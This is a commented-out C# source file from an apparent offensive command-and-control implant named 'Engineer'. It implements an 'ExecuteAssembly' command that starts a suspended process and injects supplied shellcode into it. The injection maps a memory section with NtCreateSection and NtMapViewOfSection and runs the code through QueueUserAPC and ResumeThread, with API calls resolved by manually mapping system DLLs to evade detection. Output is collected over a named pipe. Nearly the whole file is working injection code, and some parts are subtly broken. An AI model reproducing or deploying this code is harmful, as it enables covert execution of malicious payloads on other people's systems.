//using Engineer.Commands;
//using Engineer.Extra;
//using Engineer.Models;
//using Microsoft.Win32.SafeHandles;
//using System;
//using System.Collections.Generic;
//using System.Diagnostics;
//using System.Linq;
//using System.Management.Automation;
//using System.Runtime.InteropServices;
//using System.Text;
//using System.Threading;
//using System.Threading.Tasks;
//using static Engineer.Extra.h_reprobate;

//namespace Engineer.Commands
//{
//    internal class ExecuteAssembly : EngineerCommand
//    {
//        public override string Name => "ExecuteAssembly";

//        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");
//        private string Output { get; set; } = "";
//        public override async Task Execute(EngineerTask task)
//        {
//            //get some variuables ready for spawning process
//            var si = new WinAPIs.Kernel32.STARTUPINFOEX();
//            si.StartupInfo.cb = Marshal.SizeOf(si);
//            var pi = new WinAPIs.Kernel32.PROCESS_INFORMATION();
//            var pa = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
//            pa.nLength = Marshal.SizeOf(pa);
//            var ta = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
//            ta.nLength = Marshal.SizeOf(ta);

//            if (task.File.Length < 1)
//            {
//                return "error: " + "No shellcode provided";
//            }
//            //convert from base64 string to byte array
//            byte[] shellcode = task.File;

//            WinAPIs.Kernel32.SECURITY_ATTRIBUTES saAttr = new WinAPIs.Kernel32.SECURITY_ATTRIBUTES();
//            // Set the bInheritHandle flag so pipe handles are inherited. 

//            saAttr.nLength = Marshal.SizeOf(saAttr);
//            saAttr.bInheritHandle = true;
//            saAttr.lpSecurityDescriptor = IntPtr.Zero;

//            // get the address of the saAttr
//            IntPtr lpPipeAttributes = Marshal.AllocHGlobal(Marshal.SizeOf(saAttr));
//            Marshal.StructureToPtr(saAttr, lpPipeAttributes, true);


//            //create a named pipe and use it to set Console.Out and Console.Error
//            //var pipeHandle = WinAPIs.Kernel32.CreatePipe(out IntPtr outR_handle, out IntPtr outW_handle, ref saAttr, 0);
//            var pipeHandle = WinAPIs.Kernel32.CreateNamedPipe(
//               "\\\\.\\pipe\\EngineerPipe",
//               WinAPIs.Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX | WinAPIs.Kernel32.PipeOpenModeFlags.FILE_FLAG_WRITE_THROUGH, WinAPIs.Kernel32.PipeModeFlags.PIPE_TYPE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_READMODE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_WAIT, 255, 65535, 65535, 0,ref saAttr);


//            if (pipeHandle == null)
//            {
//                Console.WriteLine("Failed to create pipe");
//                return "Failed to create pipe";
//            }
//            //if(!WinAPIs.Kernel32.SetHandleInformation(outR_handle, WinAPIs.Kernel32.HANDLE_FLAGS.INHERIT, 0))
//            //{
//            //    Console.WriteLine("failed to set handle info");
//            //}

//            ////use create file api call in the new named pipe address
//            //var pipeHandle2 = WinAPIs.Kernel32.CreateFile(
//            //    "\\\\.\\pipe\\EngineerPipe",
//            //    WinAPIs.Kernel32.EFileAccess.GenericRead | WinAPIs.Kernel32.EFileAccess.GenericWrite,
//            //    WinAPIs.Kernel32.EFileShare.Read | WinAPIs.Kernel32.EFileShare.Write,
//            //    IntPtr.Zero,
//            //    WinAPIs.Kernel32.ECreationDisposition.OpenExisting,
//            //    WinAPIs.Kernel32.EFileAttributes.Normal,
//            //    IntPtr.Zero);

//            //update the si hStdOutput to use our named pipe
//            si.StartupInfo.hStdError = pipeHandle;
//            si.StartupInfo.hStdOutput = pipeHandle;
//            si.StartupInfo.dwFlags = WinAPIs.Kernel32.STARTF_USESHOWWINDOW | (int)WinAPIs.Kernel32.CreationFlags.ExtendedStartupInfoPresent | WinAPIs.Kernel32.STARTF_USESTDHANDLES;

//            // spawn new process 
//            Console.WriteLine("attempting to create new process");
//            var createProcessParameters = new object[] { $@"{SpawnTo.spawnToPath}", null, ta, pa, false, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
//            object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
//            // makes sure we have access to the correct (out) pi values from the API invoke
//            pi = (WinAPIs.Kernel32.PROCESS_INFORMATION)createProcessParameters[9];

//            if (MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread))
//            {
//                try
//                {
//                    //var hFile = new SafeFileHandle(outR_handle, false);
//                    //Read from named pipe in chunks until there is no more data to read


//                    var waitForSIngleParameters = new object[] { pi.hProcess, (uint)100 };
//                    var processExited = false;
//                    var NamedPipeDoneWaiting = false;
//                    while (true)
//                    {
//                        byte[] buffer = new byte[1024];
//                        uint bytesRead = 0;
//                        uint bytesAvail = 0;
//                        uint bytesLeft = 0;
//                        if ((uint)reprobate.DynamicAPIInvoke("kernel32.dll", "WaitForSingleObject", typeof(WinApiDynamicDelegate.WaitForSingleObject), ref waitForSIngleParameters) == 0)
//                        {
//                            processExited = true;
//                        }

//                        //if (processExited)
//                        //{
//                        //    Console.WriteLine("reading from pipe");
//                        //    byte[] buffer = System.IO.File.ReadAllBytes("\\\\.\\pipe\\EngineerPipe");
//                        //    Console.WriteLine($"read {buffer.Length} bytes");
//                        //    Output += Encoding.UTF8.GetString(buffer, 0, buffer.Length);
//                        //    break;
//                        //}

//                        var success = WinAPIs.Kernel32.ReadFile(pipeHandle, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
//                        //bool peeked = WinAPIs.Kernel32.PeekNamedPipe(pipeHandle, buffer, (uint)buffer.Length, ref bytesRead, ref bytesAvail, ref bytesLeft);
//                        Console.WriteLine($"read {buffer.Length} bytes");
//                        Output += Encoding.UTF8.GetString(buffer, 0, buffer.Length);
//                        if (peeked && bytesRead == 0)
//                        {
//                            if (processExited)
//                            {
//                                Console.WriteLine("target process is done, and 0 bytes were read from pipe exiting");
//                                break;
//                            }
//                            continue;
//                        }
//                    }
//                    return Output;
//                }
//                catch (Exception ex)
//                {
//                    Console.WriteLine(ex.Message);
//                    //Console.WriteLine(ex.StackTrace);
//                    return ex.Message;
//                }
//            }
//            return "error: " + "Failed to execute assembly";

//        }
//        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
//        {
//            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");


//            var hSection = IntPtr.Zero;
//            var maxSize = (ulong)shellcode.Length;

//            // dinvoke nt create section
//            // make object that holds the input parameters for the api
//            var createSectionParameters = new object[] { hSection, (uint)0x10000000, IntPtr.Zero, maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtCreateSection", typeof(WinApiDynamicDelegate.NtCreateSection), createSectionParameters, false);
//            hSection = (IntPtr)createSectionParameters[0];

//            // dinvoke map view of section local
//            IntPtr localBaseAddress = new IntPtr();
//            ulong viewSize = new ulong();
//            var mapViewParameters = new object[] { hSection, Process.GetCurrentProcess().Handle, localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x04 };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
//            localBaseAddress = (IntPtr)mapViewParameters[2];

//            // writeProcessMemory locally so we can map it to target after
//            var numberOfBytes = new IntPtr();
//            var writeProcessParameters = new object[] { Process.GetCurrentProcess().Handle, localBaseAddress, shellcode, (uint)shellcode.Length, numberOfBytes };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
//            numberOfBytes = (IntPtr)writeProcessParameters[4];
//            Console.WriteLine($"[+] Number of bytes written is :{(uint)numberOfBytes}");

//            // dinvoke map view of section remote which basically copies shellcode
//            IntPtr remoteBaseAddress = new IntPtr();
//            mapViewParameters = new object[] { hSection, hProcess, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x20 };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
//            remoteBaseAddress = (IntPtr)mapViewParameters[2];
//            Console.WriteLine($"Mapped view to target");

//            // Queue user APC
//            var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "QueueUserAPC", typeof(WinApiDynamicDelegate.QueueUserAPC), queueUserParameters, false);

//            // resume thread to activate 
//            var resumeThreadnParameters = new object[] { hThread };
//            // invoke the api call, pass the dll, function name, delegate type, parameters        
//            object createThreadResult = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "ResumeThread", typeof(WinApiDynamicDelegate.ResumeThread), resumeThreadnParameters, false);

//            reprobate.FreeModule(ntdll);
//            reprobate.FreeModule(ker32);

//            if ((uint)createThreadResult == 1)
//            {
//                Console.WriteLine("resumed thread");
//                return true;
//            }
//            else
//            {
//                Console.WriteLine("resumed thread failed");
//                return false;
//            }
//        }
//    }
//}
